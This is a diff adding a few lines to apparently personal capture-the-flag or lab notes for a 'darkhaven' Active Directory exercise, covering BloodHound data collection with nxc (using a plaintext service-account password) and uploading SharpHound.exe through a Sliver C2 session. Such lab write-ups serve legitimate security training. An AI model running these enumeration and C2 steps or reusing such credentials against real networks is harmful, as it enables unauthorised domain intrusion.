@@ -181,3 +181,17 @@ sudo apt install keepass2
 ![[Pasted image 20260830213214.png]]
 we were able to gain access to a bunch of creds within keepass
 
+#### Using nxc to dump data that we can use in bloodhound
+- nxc with ldap does not work..
+```python
+#This won't work in darkhaven but keeping it just in case we need it some other time
+nxc ldap dc.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!' --bloodhound -collection All
+```
+
+#### Using sharpHound instead
+- download the exe file for sharpHound from github
+- go back to the sliver session and upload it
+```python
+upload /home/tyler/hacksmarter/darkhaven/Sharphound.exe C:/Users/Administrator/Desktop
+```
+
